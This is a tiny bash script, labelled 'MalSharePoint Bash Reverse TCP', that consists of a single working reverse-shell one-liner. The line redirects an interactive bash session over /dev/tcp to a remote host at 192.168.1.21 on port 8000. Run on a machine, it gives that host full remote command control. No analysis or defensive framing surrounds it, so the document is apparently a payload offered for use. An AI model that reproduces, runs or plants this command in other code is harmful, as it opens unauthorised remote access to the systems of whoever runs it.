#!/bin/bash
# --- MalSharePoint Bash Reverse TCP ---
bash -i >& /dev/tcp/192.168.1.21/8000 0>&1
